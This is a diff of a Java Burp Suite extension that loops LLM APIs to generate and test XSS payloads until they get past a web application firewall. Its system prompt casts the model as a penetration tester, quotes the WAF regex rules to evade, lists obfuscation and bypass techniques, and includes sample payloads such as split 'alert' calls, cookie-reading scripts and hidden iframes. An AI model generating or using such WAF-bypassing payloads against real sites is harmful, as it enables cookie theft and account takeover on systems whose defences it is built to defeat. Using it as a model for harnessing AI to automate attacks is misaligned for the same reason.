@@ -16,21 +16,24 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.regex.Matcher;
 import java.util.concurrent.atomic.AtomicReference;
 import javax.swing.table.AbstractTableModel;
 import javax.swing.table.DefaultTableCellRenderer;
 import javax.swing.table.TableCellRenderer;
 import org.json.JSONObject;
 import org.json.JSONArray;
+import java.awt.event.MouseAdapter;
+import java.awt.event.MouseEvent;
 
-public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
+
+    public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
     private IBurpExtenderCallbacks callbacks;
     private IExtensionHelpers helpers;
     private JPanel mainPanel;
     private JSplitPane splitPane;
     private JButton sendToAIButton;
     private JButton stopButton;
-    private JButton manualFixButton; // 添加手动修复按钮声明
     private JTextArea requestTextArea;
     private JTextArea responseTextArea;
     private JTextArea aiResponseTextArea;
@@ -49,12 +52,14 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
     private JLabel modelNameLabel;
     private JPanel modelConfigPanel;
     private CardLayout modelConfigLayout;
+    private String originalTemplate = null;
     private List<JSONObject> messageHistory = new ArrayList<>();
-    private static final int MAX_HISTORY = 10; // 保持滑动窗口的10轮对话历史
+    private static final int MAX_HISTORY = 3; // 保持滑动窗口的3轮对话历史
+    private static final int MAX_TOKEN_LIMIT = 8000;
     private Map<Integer, Integer> testPairIdToHistoryIndex = new HashMap<>(); // 新增：跟踪测试对ID到历史索引的映射
 
-    private static final String INITIAL_PROMPT = "你是一个渗透测试专家，专注于XSS漏洞的检测和绕过WAF。我会给你完整的请求包和相应包。你需要通过以下步骤分析请求和响应：\n\n" +
-            "每轮回答牢记这条：每轮生成的xss的payload要不一样，不能和上一轮生成的一样，就算上一轮可以成功绕过waf，下一轮也要生成处不同的payload，此外如果你判断生成的payload绕过了waf，请你在输出时给我绕过的payload信息例如：bypass_payload：xxxxxx，记住只有生成的payload不被waf拦截的时候才输出bypass_payload,如果没绕过就写：本轮payload:XXXXXX,此外生成的payload尽可能少的使用空格连接，可以使用其他替代字符连接，减少网站无法识别导致400的可能,此外payload中一定尽可能少的直接出现eval等这些xss拦截高危词，可以参考一下下面的四、绕过策略决策树中的waf中xss的拦截正则的规则。\n"+
+    private static String INITIAL_PROMPT = "你是一个渗透测试专家，专注于XSS漏洞的检测和绕过WAF。我会给你完整的请求包和相应包。你需要通过以下步骤分析请求和响应：\n" +
+            "而且回答牢记这条一定牢记并遵守：每轮生成的xss的payload要不一样，不能和上一轮生成的一样，就算上一轮返回响应为200，响应信息中有绕过了waf关键词，下一轮也要生成处不同的payload，此外生成的payload不要存在空格，可以使用其他替代字符利用编码、拼接等等方式替代空格，另外每轮的payload要差别大一点，组合思路跳脱一点,而且更重要的一点，确保每次生成的xss的payload是正常的，可以使用的，不能随便瞎生成，此外payload中一定尽可能少的直接出现eval、xss、alert、console.log、javascript等这些xss拦截高危词，要使用要搭配一些分割组合等这种方式，不要直接完整的将检测关键词带入到生成的payload中一定要参考下面的的waf中xss的拦截正则的规则再就加上你自己的思路，最重要的一点【我将提供一个包含特殊占位符 <xss> 的HTTP请求模板，你的任务是只为该占位符生成一个可以绕过waf的XSS payload(条件如上)，而不返回完整的HTTP请求,记住回复内容尽快短，此外一定注意生成的payload中不要保留 <xss> 占位符，只要生成的payload，并用最简单的话描述当前payload成功绕过waf，不要输出你的思考和判断依据，并用下面这个格式输出下一轮的payload:下一轮payload:xxxxx【注意：payload前后不要有多余的<、>、`等这类多余字符，payload原格式中的不要去除，此外一定牢记payload部分请不要包含换行符，所有内容都在同一行内，结束后附上标记 --payload-end--，例如:下一轮payload: <img/src=x%20onerror=window['a'+'lert'](1) --payload-end--】\n"+
             "1. 判断是否存在XSS漏洞：\n" +
             " - 检查输入点是否被正确处理/转义\n" +
             " - 观察响应中是否包含未经过滤的注入代码\n" +
@@ -65,131 +70,92 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
             " - 响应内容中是否包含拦截提示、安全警告或错误页面\n" +
             " - 检查是否返回空白页面或与预期完全不同的内容\n" +
             " - 注入的代码是否被完全删除或明显修改\n\n" +
-            "3. WAF绕过技术：\n" +
-            " - 基础混淆与编码绕过：\n" +
-            "   - 八进制转义：`\\146\\151\\154\\164\\145\\162` → `filter` [示例来源 citation:1]\n" +
-            "   - 利用Unicode、八进制、十六进制编码（如 \\u0061\\u006C\\u0065\\u0072\\u0074(1) 或 \\141\\154\\145\\162\\164(1)）\n" +
-            " - 字符串分割与注释插入：\n" +
-            "   - 将关键字拆分，如将 \"javascript:\" 拆成 \"java\"+\"script:\"，或在关键字中插入内联注释（例如 \"ja<!--comm-->vascript:\"）\n" +
-            "   - 利用控制字符或 /**/ 替代空格，扰乱WAF的正则匹配\n" +
-            " - 函数调用混淆：\n" +
-            "   - 利用构造函数绕过，如使用 [\"filter\"][\"constructor\"](\"alert(1)\")() 或 self[\"Function\"](\"alert(1)\")()\n" +
-            "   - 拼接关键字（例如将 \"alert(1)\" 拆为 \"ale\"+\"rt(1)\"），绕过关键字检测\n" +
-            " - 事件属性与非传统标签：\n" +
-            "   - 使用不常见或HTML5新增事件（如 onauxclick、onmouseleave、ontoggle）替代传统的 onerror/onload\n" +
-            "   - 利用除 <script> 之外的标签（例如 <iframe>、<audio>、<video>、<svg>、<object>、<button>、<div>）结合事件属性注入恶意代码\n" +
-            "   - SVG矢量：`<svg/onload=confirm(1)>`\n" +
-            "   - MathML：`<math><maction actiontype=statusline#xover=alert(1)>`\n" +
-            "   - 多媒体标签：`<video poster=javascript:alert(1)>` :cite[4]\n\n" +
-            " - 数据协议和流方式绕过：\n" +
-            "   - 采用data URI方案，通过base64编码构造恶意payload（例如 data:text/html;base64,...）\n" +
-            "   - 利用HTTP协议特性，如Transfer-Encoding: chunked、分块传输、HTTP参数污染、脏数据等方式绕过部分WAF检测\n" +
-            "- 非常规事件触发绕过\n" +
-            "   - 触控事件：`ontouchstart`/`onpointerenter`\n" +
-            "   - 表单事件：`onforminput`/`onautocomplete`\n" +
-            "   - HTML5新事件：`onauxclick`/`onbeforeinput` [绕过案例 citation:7]\n\n" +
-            " - 多手法组合：\n" +
-            "   - 综合运用上述方法，构造多层混淆的Payload，如使用编码、注释、字符串拼接等方式组合（例如 [][\"filter\"][\"constructor\"](\"alert(1)\")() 或 a=\"al\"; b=\"ert\"; self[a+b]();）\n" +
-            "   - 根据目标WAF的特性，动态调整payload构造策略，最大限度规避正则和黑名单过滤\n\n" +
-
-            "【重要！】当你建议新的HTTP请求时，请严格按照以下规范提供：\n" +
-            "1. 必须包含完整的HTTP请求行、所有必需的HTTP头、空行（\\r\\n\\r\\n）和请求体\n" +
-            "2. 请求行必须包含HTTP方法、请求路径和HTTP版本\n" +
-            "3. 必须包含Host头部\n" +
-            "4. 对于POST/PUT请求，必须包含正确的Content-Type和Content-Length\n" +
-            "5. 维持原始请求中的所有其他必要头部\n" +
-            "6. 在提供HTTP请求之前，使用```http标记，之后使用```结束\n" +
-            "7. 不要添加任何额外的格式或说明文字到HTTP请求中\n" +
-            "8. 确保请求体（如有）内容完整且格式正确\n\n" +
-
-            "示例格式：\n" +
-            "```http\n" +
-            "POST /example.php HTTP/1.1\n" +
-            "Host: example.com\n" +
-            "User-Agent: Mozilla/5.0\n" +
-            "Content-Type: application/x-www-form-urlencoded\n" +
-            "Content-Length: 27\n" +
-            "Connection: close\n" +
-            "\n" +
-            "param1=value1&param2=value2\n" +
-            "```\n\n" +
+            "3. 请你参考下列这些xss的WAF绕过技术，但不只限于这些方法：\n" +
+            "而且生成的xss绕过payload尽可能的短一些，有利于限制长度的xss插入场景，此外尽可能的使用多种绕过思路进行组合绕过\n"+
+            " 此外这是一些常见waf的xss拦截的正则匹配规则，你生成的payload首先要想办法不触发这些waf对xss匹配的正则：<(iframe|script|body|img|layer|div|meta|style|base|object|input)\n" +
+            "(onmouseover|onerror|onload)=\n" +
+            "<a\\s+[^>]*href\\s*=\\s*['\"]?javascript:.*\n"+
+            "对符合进行编码，字符串分割与注释插入，将关键字拆分\n"+
+            "函数调用混淆和事件属性与非传统冷漠标签的代替等\n"+
+            "数据协议和流方式绕过、非常规事件触发绕过、逻辑级绕过、字符串拆解\n" +
+            "叠加、隐形iframe、数学表达式、字符串逆序运算组合等\n" +
+            "使用上述方法但不只限于上述思路，你也可以有自己的思路去构造多层混淆的Payload\n" +
+            "但根据目标WAF的特性，动态调整payload构造策略，最大限度规避正则和黑名单过滤\n\n" +
 
             "一、WAF存在性检测阶段\n\n" +
             "基础特征分析：\n" +
-            "检查HTTP响应头中是否包含Cloudflare/Akamai/Imperva等WAF标识\n" +
+            "检查HTTP响应头中是否包含场景WAF的标识\n" +
             "分析响应状态码异常（如403/406/501非预期状态）\n" +
             "计算请求响应时间差（>2秒可能触发行为分析）\n\n" +
             "二、基础注入验证\n\n" +
-            "无害探针注入：\n" +
-            "<svg%0aonload=confirm(1)>\n" +
-            "\"><img src=x onerror=alert(1)>\n\n" +
+            "无害探针注入可以参考下面的，也按照你自己的思路来，随机生成，直接使用绕过思路生成即可,但生成的payload要符合xss注入的格式，不能瞎生成，每轮只生成一个就可以，参考但一定不只限于这个payload：\n" +
             "<script>alert(document.cookie)</script>\n"+
             "响应特征比对：\n" +
             "原始payload留存率分析（完整度≥80%？）\n" +
             "特殊字符存活统计（<>\"'/等字符过滤情况）\n" +
             "上下文语义完整性检测（是否破坏原有HTML结构）\n\n" +
-            "三、WAF拦截判定矩阵\n" +
-            "请建立三维判定模型：\n" +
-            "| 检测维度 | 阳性特征 | 权重 |\n" +
-            "|-----------------|-----------------------------------|------|\n" +
-            "| 响应内容 | 包含blocked/forbidden/detected等关键词 | 0.7 |\n" +
-            "| HTTP状态码 | 403/406/419/503 | 0.9 |\n" +
-            "| 响应延迟 | ≥1500ms | 0.5 |\n" +
-            "| 字符转换 | >50%特殊字符被编码/删除 | 0.8 |\n\n" +
-            "综合评分≥1.5分判定为WAF拦截\n\n" +
-            "四、绕过策略决策树\n" +
-            "请灵活调整尝试上文中-->3. WAF绕过技术和下面的技术，重复的就不要使用了，此外还可以对照下面的一些场景waf的xss拦截的匹配规则进行绕过payload生成：\n" +
-            " 此外这是一些场景waf的xss拦截的匹配规则，可以作为你绕过payload的生成的参考依据：<(iframe|script|body|img|layer|div|meta|style|base|object|input)\n" +
-            "(onmouseover|onerror|onload)=\n" +
-            "<a\\s+[^>]*href\\s*=\\s*['\"]?javascript:.*\n"+
-            "此外生成的xss绕过payload尽可能的短一些，有利于限制长度的xss插入场景，此外尽可能的使用多种绕过思路进行组合绕过\n"+
-            "1. 字符级绕过：\n" +
-            " - 控制字符注入：%0d%0a%09等\n\n" +
-            "2. 语法级绕过：\n" +
-            " - 标签属性嵌套：<a href=\"javascript:alert`1`\">\n" +
-            " - 事件处理变形：onpointerenter=alert(1)\n" +
-            " - SVG矢量封装：<svg/onload=alert(1)>\n\n" +
-            "3. WAF绕过技术：\n" +
-            " - 基础混淆与编码绕过：\n" +
-            "   -对符合进行编码，例如< = %3c、> = %3e、 \" = %22、[ = %5b、` = %60等等\n"+
-            "   - URL编码及二次URL编码，确保WAF解码不完全导致恶意代码隐藏\n" +
-            "   - 利用Unicode、八进制、十六进制编码（如 \\u0061\\u006C\\u0065\\u0072\\u0074(1) 或 \\141\\154\\145\\162\\164(1)）\n" +
-            " - 字符串分割与注释插入：\n" +
-            "   - 将关键字拆分，如将 \"javascript:\" 拆成 \"java\"+\"script:\"，或在关键字中插入内联注释（例如 \"ja<!--comm-->vascript:\"）\n" +
-            "   - 利用控制字符或 /**/ 替代空格，扰乱WAF的正则匹配\n" +
-            " - 函数调用混淆：\n" +
-            "   - 利用构造函数绕过，如使用 [\"filter\"][\"constructor\"](\"alert(1)\")() 或 self[\"Function\"](\"alert(1)\")()\n" +
-            "   - 拼接关键字（例如将 \"alert(1)\" 拆为 \"ale\"+\"rt(1)\"），绕过关键字检测\n" +
-            " - 事件属性与非传统标签：\n" +
-            "   - 使用不常见或HTML5新增事件（如 onauxclick、onmouseleave、ontoggle）替代传统的 onerror/onload\n" +
-            "   - 利用除 <script> 之外的标签（例如 <iframe>、<audio>、<video>、<svg>、<object>、<button>、<div>）结合事件属性注入恶意代码\n" +
-            " - 数据协议和流方式绕过：\n" +
-            "   - 采用data URI方案，通过base64编码构造恶意payload（例如 data:text/html;base64,...）\n" +
-            "   - 利用HTTP协议特性，如Transfer-Encoding: chunked、分块传输、HTTP参数污染、脏数据等方式绕过部分WAF检测\n" +
-            " - 多手法组合：\n" +
-            "   - 综合运用上述方法，构造多层混淆的Payload，如使用编码、注释、字符串拼接等方式组合（例如 [][\"filter\"][\"constructor\"](\"alert(1)\")() 或 a=\"al\"; b=\"ert\"; self[a+b]();）\n" +
-            "   - 根据目标WAF的特性，动态调整payload构造策略，最大限度规避正则和黑名单过滤\n\n" +
-            "4. 逻辑级绕过：\n" +
-            " - 字符串拆解：eval('al'+'er'+'t(1)')\n" +
-            " - 环境检测触发：window.innerWidth>0&&alert(1)\n\n" +
-            "5. 高级iframe技术：\n" +
-            " - 叠加iframe：<iframe src=\"目标网站\" style=\"opacity:0.1;position:absolute;top:0;left:0;width:100%;height:100%;z-index:999999\"></iframe>\n" +
-            " - 隐形iframe：<iframe src=\"javascript:alert(document.domain)\" style=\"display:none\"></iframe>\n\n" +
-            "6. 逻辑混淆技术：\n" +
-            " - 数学表达式：window[['al','ert'].join('')](1)\n" +
-            " - 位运算混淆：(0x61^0x04) + (0x6c^0x0f).toString(30)\n" +
-            " - 字符串逆序：eval('trela'.split('').reverse().join('')+'(1)')\n" +
-            " - 环境检测触发：navigator.pdfViewerOpen===undefined&&alert(1)\n\n" +
-
-            "五、XSS成功验证标准\n" +
+            "三、XSS成功验证标准\n" +
             "首先必须满足条件1，就是下面的状态码正常，此外再条件2条件才能判定XSS成功：\n\n" +
             "1. 状态码正常：\n" +
-            " - HTTP响应为403、400、40X这类状态码，则表示请求被WAF阻断，AI直接判定为输出为被WAF拦截即可，不再进行分析\n\n" +
+            " - HTTP响应为403、400、40X这类状态码，则表示" +
+            "请求被WAF阻断，AI直接判定为输出为被WAF拦截即可，不再进行分析\n\n" +
             "2. 满足以下三项中的任意两项：\n" +
             " - DOM变更检测：document.documentElement.innerHTML中包含有效payload\n" +
             " - 新建script节点可见于DOM树\n" +
             " - 错误诱导：生成非常规JS错误（如未定义函数故意调用）\n\n" +
             "注意！！！！！！不需要过多回复，只需要给我结论，是否xss成功，是否被waf拦截，然后按照上述格式要求给出一个完整的修改后的HTTP请求，请确保请求格式完全正确，我会使用你提供的请求进行测试，并将结果返回给你继续分析，如果没有收到相应包，那就直接判断被拦截，xss失败";
+
+    /**
+     * 估算文本的token数，简单认为每4个字符为1个token
+     */
+    private int estimateTokenCount(String text) {
+        if (text == null) return 0;
+        return text.length() / 4;  // 简单估算：每4个字符算1 token
+    }
+
+    /**
+     * 计算消息历史中所有消息的总token数
+     */
+    private int calculateTotalTokens(List<JSONObject> messages) {
+        int total = 0;
+        for (JSONObject msg : messages) {
+            total += estimateTokenCount(msg.optString("content", ""));
+        }
+        return total;
+    }
+
+    /**
+     * 对内容进行截断处理，防止过长。maxLength可根据需求调整
+     */
+    private String truncateContent(String content, int maxLength) {
+        if (content == null) return "";
+        return content.length() > maxLength ? content.substring(0, maxLength) + "...(truncated)" : content;
+    }
+
+    /**
+     * 裁剪消息历史，始终保留系统消息，并从最新的消息开始往前累加，
+     * 直到总token数达到预设阈值
+     */
+    private void trimMessageHistory() {
+        // 始终保留第一个系统提示
+        List<JSONObject> newHistory = new ArrayList<>();
+        if (!messageHistory.isEmpty()) {
+            newHistory.add(messageHistory.get(0));
+        }
+        int totalTokens = newHistory.isEmpty() ? 0 : estimateTokenCount(newHistory.get(0).optString("content", ""));
+        // 从最新的消息开始向前累加，直到达到token限制
+        for (int i = messageHistory.size() - 1; i >= 1; i--) {
+            JSONObject msg = messageHistory.get(i);
+            int msgTokens = estimateTokenCount(msg.optString("content", ""));
+            if (totalTokens + msgTokens < MAX_TOKEN_LIMIT) {
+                newHistory.add(1, msg); // 保持系统消息在最前面
+                totalTokens += msgTokens;
+            } else {
+                break;
+            }
+        }
+        messageHistory = newHistory;
+    }
 
     @Override
     public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
@@ -228,16 +194,15 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
                 apiProviderSelector = new JComboBox<>(new String[]{"DeepSeek", "SiliconFlow", "Kimi", "QwenAI"});
                 apiPanel.add(apiProviderSelector, gbc);
                 // 添加开发者信息标签（显示在右上角）
-                JLabel developerLabel = new JLabel("公众号：白昼信安");
-                developerLabel.setHorizontalAlignment(SwingConstants.RIGHT);
+                // 多行文本，使用HTML换行
+                // 4) "开发者信息" 多行文本
+                JLabel developerLabel = new JLabel("公众号：白昼信安\n     by:M9");
                 GridBagConstraints gbc_dev = new GridBagConstraints();
-                gbc_dev.anchor = GridBagConstraints.EAST;
-                gbc_dev.insets = new Insets(5, 5, 5, 5);
-                gbc_dev.gridx = 3; // 放在右侧
+                gbc_dev.gridx = 3;
                 gbc_dev.gridy = 0;
-                gbc_dev.gridwidth = 1;
+                gbc_dev.insets = new Insets(5, 5, 5, 5);
+                gbc_dev.anchor = GridBagConstraints.EAST; // 靠右
                 apiPanel.add(developerLabel, gbc_dev);
-
 
 // API密钥
                 gbc.gridx = 0;
@@ -300,7 +265,7 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
 
                 sfGbc.gridx = 1;
                 sfGbc.fill = GridBagConstraints.HORIZONTAL;
-                JTextField siliconFlowModelField = new JTextField("ft:", 40);
+                JTextField siliconFlowModelField = new JTextField("", 40);
                 siliconflowPanel.add(siliconFlowModelField, sfGbc);
                 modelConfigPanel.add(siliconflowPanel, "SiliconFlow");
 
@@ -340,6 +305,7 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
                 gbc.gridwidth = 3;
                 apiPanel.add(modelConfigPanel, gbc);
 
+
 // 显示初始模型配置面板
                 modelConfigLayout.show(modelConfigPanel, (String) apiProviderSelector.getSelectedItem());
 
@@ -360,15 +326,23 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
                 JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
                 sendToAIButton = new JButton("开启AI分析");
                 stopButton = new JButton("停止分析");
-                JButton clearHistoryButton = new JButton("清除AI分析记录");
-// 新增：手动修复请求按钮
-                manualFixButton = new JButton("Manual Fix & Continue");
-                stopButton.setEnabled(false);
-                manualFixButton.setEnabled(false); // 默认禁用，只有在提取请求失败时启用
+                JButton clearHistoryButton = new JButton("清除全部记录");
                 buttonPanel.add(sendToAIButton);
                 buttonPanel.add(stopButton);
-                buttonPanel.add(manualFixButton);
                 buttonPanel.add(clearHistoryButton);
+
+
+                // 添加“保存模板”按钮，将当前请求文本保存为模板
+                JButton saveTemplateButton = new JButton("保存模板");
+                buttonPanel.add(saveTemplateButton);
+                saveTemplateButton.addActionListener(new ActionListener() {
+                    @Override
+                    public void actionPerformed(ActionEvent e) {
+                        // 将右侧请求文本框内容作为模板保存到全局变量 originalTemplate 中
+                        originalTemplate = requestTextArea.getText();
+                        logToUI("已保存请求模板，模板中应包含 <xss> 占位符。");
+                    }
+                });
 
 // Create history table
                 historyTable = new JTable(historyTableModel);
@@ -401,8 +375,6 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
                 }
 
                 JScrollPane historyScrollPane = new JScrollPane(historyTable);
-
-// Create request/response/ai response panel
                 requestTextArea = new JTextArea(10, 50);
                 responseTextArea = new JTextArea(10, 50);
                 aiResponseTextArea = new JTextArea(10, 50);
@@ -414,7 +386,41 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
                 JScrollPane aiResponseScrollPane = new JScrollPane(aiResponseTextArea);
                 JScrollPane logScrollPane = new JScrollPane(logTextArea);
 
-// Add labels to panels
+                // 在 requestTextArea 初始化后，添加右键菜单
+                requestTextArea.addMouseListener(new MouseAdapter() {
+                    @Override
+                    public void mousePressed(MouseEvent e) {
+                        if (e.isPopupTrigger()) {
+                            showPopup(e);
+                        }
+                    }
+
+                    @Override
+                    public void mouseReleased(MouseEvent e) {
+                        if (e.isPopupTrigger()) {
+                            showPopup(e);
+                        }
+                    }
+
+                    private void showPopup(MouseEvent e) {
+                        JPopupMenu popupMenu = new JPopupMenu();
+
+                        // 创建“Send to Repeater”菜单项
+                        JMenuItem sendToRepeaterItem = new JMenuItem("Send to Repeater");
+                        sendToRepeaterItem.addActionListener(new ActionListener() {
+                            @Override
+                            public void actionPerformed(ActionEvent evt) {
+                                // 这里是点击菜单后真正执行的逻辑
+                                sendCurrentRequestToRepeater();
+                            }
+                        });
+
+                        popupMenu.add(sendToRepeaterItem);
+                        popupMenu.show(e.getComponent(), e.getX(), e.getY());
+                    }
+                });
+
+
                 JPanel requestPanel = new JPanel(new BorderLayout());
                 requestPanel.add(new JLabel("Request:"), BorderLayout.NORTH);
                 requestPanel.add(requestScrollPane, BorderLayout.CENTER);
@@ -427,24 +433,48 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
                 aiResponsePanel.add(new JLabel("AI 分析结果:"), BorderLayout.NORTH);
                 aiResponsePanel.add(aiResponseScrollPane, BorderLayout.CENTER);
 
-// Add the log panel
+
                 JPanel logPanel = new JPanel(new BorderLayout());
                 logPanel.add(new JLabel("Logs:"), BorderLayout.NORTH);
                 logPanel.add(logScrollPane, BorderLayout.CENTER);
 
-// Create tab pane for request, response, AI analysis
+
                 JTabbedPane tabbedPane = new JTabbedPane();
                 tabbedPane.addTab("Request", requestPanel);
                 tabbedPane.addTab("Response", responsePanel);
                 tabbedPane.addTab("AI 分析结果", aiResponsePanel);
+                JPanel promptTabPanel = new JPanel(new BorderLayout());
 
-// Add the log panel to the bottom
+// 提示词编辑区
+                JTextArea promptTextArea = new JTextArea(INITIAL_PROMPT, 10, 50);
+                promptTextArea.setLineWrap(true);
+                promptTextArea.setWrapStyleWord(true);
+                JScrollPane promptScrollPane = new JScrollPane(promptTextArea);
+
+// “保存提示词”按钮
+                JButton savePromptButton = new JButton("保存提示词");
+                savePromptButton.addActionListener(new ActionListener() {
+                    @Override
+                    public void actionPerformed(ActionEvent e) {
+                        INITIAL_PROMPT = promptTextArea.getText();
+                        logToUI("AI提示词已更新！");
+                    }
+                });
+
+// 布局到面板
+                promptTabPanel.add(promptScrollPane, BorderLayout.CENTER);
+                promptTabPanel.add(savePromptButton, BorderLayout.SOUTH);
+
+// 把这个面板添加为一个新的标签
+                tabbedPane.addTab("当前AI提示词", promptTabPanel);
+
+
                 JSplitPane mainContentPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                 mainContentPane.setTopComponent(tabbedPane);
                 mainContentPane.setBottomComponent(logPanel);
                 mainContentPane.setResizeWeight(0.8);
 
-// Main split panel
+
                 JSplitPane mainSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
                 mainSplitPane.setLeftComponent(historyScrollPane);
                 mainSplitPane.setRightComponent(mainContentPane);
@@ -462,7 +492,6 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
 // 创建一个对象用于存储当前迭代状态
                 final AtomicReference<AISessionState> sessionState = new AtomicReference<>(new AISessionState());
 
-// Register event listeners
                 sendToAIButton.addActionListener(new ActionListener() {
                     @Override
                     public void actionPerformed(ActionEvent e) {
@@ -483,36 +512,28 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
                     @Override
                     public void actionPerformed(ActionEvent e) {
                         stopAISession();
-                        manualFixButton.setEnabled(false);
-                    }
-                });
-
-// 新增：手动修复请求按钮的事件监听器
-                manualFixButton.addActionListener(new ActionListener() {
-                    @Override
-                    public void actionPerformed(ActionEvent e) {
-                        AISessionState state = sessionState.get();
-                        if (state != null && isRunning) {
-                            String fixedRequest = requestTextArea.getText();
-                            if (fixedRequest != null && !fixedRequest.isEmpty()) {
-                                state.setManualFixedRequest(fixedRequest);
-                                state.setWaitingForManualFix(false);
-                                manualFixButton.setEnabled(false);
-                                logToUI("应用手动修复，继续人工智能会话...");
-                                continuteAISessionWithFixedRequest(state);
-                            }
-                        }
                     }
                 });
 
                 clearHistoryButton.addActionListener(new ActionListener() {
                     @Override
                     public void actionPerformed(ActionEvent e) {
+                        // 清空对话历史和测试记录
                         messageHistory.clear();
                         history.clear();
-                        testPairIdToHistoryIndex.clear(); // 清除映射
+                        testPairIdToHistoryIndex.clear();
                         historyTableModel.fireTableDataChanged();
-                        logToUI("AI对话历史和测试历史已清除");
+
+                        // 清空所有文本区域
+                        requestTextArea.setText("");
+                        responseTextArea.setText("");
+                        aiResponseTextArea.setText("");
+                        logTextArea.setText("");
+
+                        // 清除请求模板
+                        originalTemplate = "";
+
+                        logToUI("全部面板内容和请求模板已清除");
                     }
                 });
 
@@ -543,20 +564,6 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
     // 新增：AI会话状态类，用于在不同迭代之间保持状态
     private class AISessionState {
         private int iterationCount = 0;
-        // 新增：提取失败计数器，初始值为0
-        private int extractionFailureCount = 0;
-
-        public int getExtractionFailureCount() {
-            return extractionFailureCount;
-        }
-
-        public void resetExtractionFailureCount() {
-            this.extractionFailureCount = 0;
-        }
-
-        public void incrementExtractionFailureCount() {
-            this.extractionFailureCount++;
-        }
         private String lastAIResponse = null;
         private boolean waitingForManualFix = false;
         private String manualFixedRequest = null;
@@ -698,63 +705,33 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
         String apiProvider = (String) apiProviderSelector.getSelectedItem();
         logToUI("开始AI会话 " + apiProvider + " API");
 
-// Initialize message history if empty (first run)
+//如果为空，则初始化消息历史(第一次运行)
         if (messageHistory.isEmpty()) {
-// Add system message
+            // Add system message
             JSONObject systemMessage = new JSONObject();
             systemMessage.put("role", "system");
             systemMessage.put("content", INITIAL_PROMPT);
             messageHistory.add(systemMessage);
         }
 
-// Start in a background thread
+// 在后台线程中启动
         new Thread(() -> {
             String initialConversation = "Initial HTTP Request:\n\n" + requestContent;
             String responseContent = responseTextArea.getText();
             if (!responseContent.isEmpty()) {
+                // 对响应内容进行截断，防止过长
+                responseContent = truncateContent(responseContent, 5000);
                 initialConversation += "\n\nInitial HTTP Response:\n\n" + responseContent;
             }
-
-// Add user's initial message
+            // 添加用户的初始消息
             JSONObject userMessage = new JSONObject();
             userMessage.put("role", "user");
             userMessage.put("content", initialConversation);
 
-// 使用滑动窗口管理对话历史
-// 保留系统消息（索引0），然后添加最新消息
-            if (messageHistory.size() > 1) { // 已经有历史对话
-                List<JSONObject> tempHistory = new ArrayList<>();
-
-// 总是保留系统消息
-                tempHistory.add(messageHistory.get(0));
-
-// 确定需要保留的轮数
-                int totalPairs = (messageHistory.size() - 1) / 2; // 除去系统消息后的对话对数
-                int startPair = Math.max(0, totalPairs - MAX_HISTORY + 1); // 确保至少保留最近的MAX_HISTORY对
-
-// 添加需要保留的历史消息
-                for (int i = startPair; i < totalPairs; i++) {
-                    int userIndex = i * 2 + 1; // 用户消息的索引
-                    int assistantIndex = userIndex + 1; // 助手消息的索引
-
-                    if (userIndex < messageHistory.size()) {
-                        tempHistory.add(messageHistory.get(userIndex));
-                    }
-
-                    if (assistantIndex < messageHistory.size()) {
-                        tempHistory.add(messageHistory.get(assistantIndex));
-                    }
-                }
-
-// 添加最新的用户消息
-                tempHistory.add(userMessage);
-
-// 更新消息历史
-                messageHistory = tempHistory;
-            } else {
-// 第一次对话，直接添加用户消息
-                messageHistory.add(userMessage);
-            }
+            // 使用基于token数量的裁剪方式管理对话历史
+            // 始终先调用 trimMessageHistory() 确保历史不会超限，然后添加最新用户消息
+            trimMessageHistory();
+            messageHistory.add(userMessage);
 
             processAIIteration(sessionState);
 
@@ -807,41 +784,52 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
                 }
             });
 
-// 从 AI 回复中提取 HTTP 请求
-            String extractedRequest = extractRequestFromAIResponse(aiResponse);
+// 定义最大重试次数
+            int maxRetries = 5;
+            int retryCount = 0;
+            String extractedPayload = null;
 
-            if (extractedRequest != null && !extractedRequest.isEmpty()) {
-                // 提取成功，重置提取失败计数
-                sessionState.resetExtractionFailureCount();
-
-                logToUI("成功提取到合法的请求，准备进行验证和修复");
-                // 验证和修复请求
-                extractedRequest = validateAndFixRequest(extractedRequest);
-                if (extractedRequest == null) {
-                    handleRequestExtractionFailure(sessionState, "请求验证失败");
-                    return;
+// 尝试循环提取payload
+            while (retryCount < maxRetries) {
+                extractedPayload = extractPayloadFromAIResponse(aiResponse);
+                if (extractedPayload != null && !extractedPayload.isEmpty()) {
+                    break;
                 }
-                // 继续处理有效的请求
-                processValidRequest(extractedRequest, sessionState);
-            } else {
-                // 提取失败，增加计数
-                sessionState.incrementExtractionFailureCount();
-                int retries = sessionState.getExtractionFailureCount();
-                if (retries < 3) {
-                    logToUI("提取HTTP请求失败，正在重新请求（重试 " + retries + " 次）...");
-                    try {
-                        Thread.sleep(1000);
-                    } catch (InterruptedException ie) {
-                        // 此处可以记录日志或忽略
-                    }
-                    processAIIteration(sessionState);
-                    return;
-                } else {
-                    // 重试次数达到上限后，提示用户手动修复
-                    handleRequestExtractionFailure(sessionState, "无法从 AI 回复中提取到合法的 HTTP 请求");
-                    return;
+                retryCount++;
+                logToUI("提取payload失败，等待2秒后重试 (第 " + retryCount + " 次)...");
+                try {
+                    Thread.sleep(2000);
+                } catch (InterruptedException ie) {
+                    // 如果被中断，则跳出循环
+                    break;
                 }
             }
+
+// 判断是否成功提取payload
